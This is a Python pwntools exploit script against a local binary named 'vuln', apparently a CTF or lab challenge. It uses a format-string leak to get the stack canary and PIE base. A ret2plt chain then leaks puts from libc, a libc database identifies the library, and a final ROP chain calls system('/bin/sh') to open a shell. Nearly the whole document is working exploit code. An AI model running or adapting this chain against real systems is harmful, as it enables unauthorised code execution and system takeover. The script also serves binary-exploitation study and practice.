from pwn import *
from pylibcdb.LibcDB import LibcDB

#canary is 15
#libc is 17
#address in the exe is 25, for pie
#address 3 and 5 are in the heap

p = process("./vuln")
elf = ELF("./vuln")

#PIE and CANARY LEAK
p.recvuntil(b": ")
p.sendline(b"%25$lx-%15$lx")
p.recvline()
leak = p.recvline()
pie_base = int(leak.strip().split(b'-')[0], 16) - 0x11b6
canary = int(leak.strip().split(b'-')[1], 16)
log.success("Canary leaked: " + hex(canary))
log.success("Base address: " + hex(pie_base))
#pause()

pop_rdi = 0x00000000000011b1 + pie_base		#pop rdi ; ret
ret = 0x000000000000101a + pie_base #ret
start = elf.symbols['_start'] + pie_base 	#start works, main cause a segmentation fault
puts_got = elf.got['puts'] + pie_base
puts_plt = elf.plt['puts'] + pie_base

log.info("_start address: " + hex(start))
log.info("pop_rdi gadget: " + hex(pop_rdi))
log.info("puts_got address: " + hex(puts_got))
log.info("puts_plt address: " + hex(puts_plt))
#With pause and we can check on gdb at main+127 the new value of RDX and we can see the canary or our buffer
#so we can find the offset to overwrite the canary

payload  = b"A"*72 + p64(canary) + b"B"*8
payload += p64(start)
p.recvuntil(b": \n")
p.sendline(payload)

#RET2PLT to leak a puts address into libc
p.recvline()
p.sendline(b"AAAA")
p.recvline()
p.recvline()

payload  = b"A"*72 + p64(canary) + b"B"*8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(start)

p.sendline(payload)

recieved = p.recvline().strip()
libc_leak = u64(recieved.ljust(8, "\x00".encode()))
log.info("Leaked libc address, puts: %s" % hex(libc_leak))


#LIBC DEANONYMIZATION
libcdb = LibcDB("/home/exploitation/libc-database")
libc_name = libcdb.find_by_address(hex(libc_leak), symbol="puts")
print("NAME OF DISCOVERED LIBC: " +libc_name)
libc_path = libcdb.download_by_name(libc_name)
print("PATH OF DISCOVERED LIBC: " + libc_path)

libc = ELF(libc_path, checksec=False)

libc.address = libc_leak - libc.sym["puts"]
log.info("Address of libc %s " % hex(libc.address))

binsh = next(libc.search("/bin/sh".encode())) #Verify with find /bin/sh
system = libc.sym["system"]

log.info("bin/sh %s " % hex(binsh))
log.info("system %s " % hex(system))

#SYSTEM(BINSH) to get a shell
payload  = b"A"*72 + p64(canary) + b"B"*8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

#pause()
p.recvline()
p.sendline(b"AAAA")
p.recvline()
p.recvline()
p.sendline(payload)
p.interactive()